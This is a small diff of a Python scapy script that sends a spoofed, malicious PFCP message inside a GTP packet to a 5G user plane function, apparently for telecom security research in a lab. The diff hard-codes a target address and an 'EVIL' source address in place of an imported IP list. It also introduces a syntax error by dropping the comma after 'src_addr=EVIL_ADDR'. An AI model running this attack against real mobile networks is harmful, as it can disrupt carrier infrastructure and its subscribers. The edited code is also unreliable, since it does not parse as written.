@@ -4,10 +4,10 @@ from scapy.contrib.pfcp import *
 import sys
 import random
 import time
-from ....src import ip_list
 
+UPF_ADDR = "10.100.200.2"
+EVIL_ADDR = "10.100.200.66"
 
-PFCP_PORT = 8805
 
 seq = 1
 
@@ -99,7 +99,7 @@ def send_malicious_pfcp_in_gtp_packet(
 
 
 send_malicious_pfcp_in_gtp_packet(
-    src_addr=ip_list["EVIL"],
-    dest_addr=ip_list["UPF"],
+    src_addr=EVIL_ADDR
+    dest_addr=UPF_ADDR,
     teid=sys.argv[1],
 )
